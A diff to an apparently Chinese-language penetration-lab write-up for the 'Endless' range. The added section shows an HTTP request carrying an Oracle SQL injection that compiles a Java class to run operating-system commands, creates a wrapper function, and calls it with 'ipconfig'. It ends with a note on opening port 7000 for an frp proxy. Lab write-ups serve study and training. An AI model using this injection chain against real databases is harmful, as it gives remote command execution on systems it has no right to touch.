@@ -213,7 +213,55 @@ start vulscan
 
 参考这篇 [靶机WP博客](https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/)
 
+
+
+
+```
+GET / HTTP/1.1
+Host: 39.101.161.22
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=EAE485C1FEBDE7010D00FCB7025E3B70
+Connection: close
+Content-Length: 931
+
+name=admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "CommandExecutor" AS
+import java.io.*;
+public class CommandExecutor {
+    public static String execute(String command)  {
+        try {
+            Process process = Runtime.getRuntime().exec(command);
+            InputStream inputStream = process.getInputStream();
+            BufferedReader input = new BufferedReader(new InputStreamReader(inputStream, "GBK"));
+            String line;
+            StringBuilder output = new StringBuilder();
+            while ((line = input.readLine()) != null) {
+                output.append(line).append("\n");
+            }
+            input.close();
+            return output.toString();
+
+        } catch (Exception e) {
+            return e.toString();
+        }
+    }
+}
+'';commit;end;') from dual)>1 --
+
+```
+
+```
+name=admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''CREATE OR REPLACE FUNCTION execute_command(command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME ''''CommandExecutor.execute(java.lang.String) return java.lang.String''''; '';commit;end;') from dual)>1--
+
+
+name=admin' union select null,(select execute_command('ipconfig') from dual),null from dual--
+```
 ![](assets/file-20260529165047140.png)
+
 
 ## 搭建frp代理
 阿里云已经开放7000端口了，有防火墙还要再次执行`ufw allow 7000/tcp`
